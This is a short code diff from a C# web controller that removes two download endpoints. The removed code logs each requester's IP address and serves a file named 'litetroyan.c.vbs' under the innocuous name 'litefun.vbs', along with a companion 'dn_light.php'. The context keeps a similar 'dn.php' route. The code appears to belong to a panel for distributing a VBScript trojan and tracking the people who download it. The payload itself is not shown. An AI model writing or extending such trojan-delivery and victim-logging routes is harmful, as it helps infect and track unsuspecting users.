@@ -262,26 +262,6 @@ public class CpController : Controller
     {
         return await GetFileAdvanced(server, "dn.php", "dn.php", "", "", "","nofile");
     }
-    
-    [HttpGet("{server}/{profile}/{random}/{target}/GetLightVbs")]
-    public async Task<IActionResult> GetLiteVbs(string server, string profile, string random, string target)
-    {
-        var ipAddress = GetIp();
-        if (string.IsNullOrWhiteSpace(ipAddress))
-            return BadRequest("IP address not found.");
-        if (string.IsNullOrWhiteSpace(server))
-            return BadRequest("Server address not found.");
-
-        await DnLog(server, profile, ipAddress);
-        
-        return await GetFileAdvanced(server, "litetroyan.c.vbs", "litefun.vbs", random, target, "vbs", "");
-    }
-    
-    [HttpGet("{server}/{profile}/GetLightVbsPhp")]
-    public async Task<IActionResult> GetLiteVbsPhp(string server, string profile)
-    {
-        return await GetFileAdvanced(server, "dn_light.php", "dn_light.php", "", "", "", "nofile");
-    }
 
     protected async Task DnLog(string server, string profile, string ipAddress)
     {
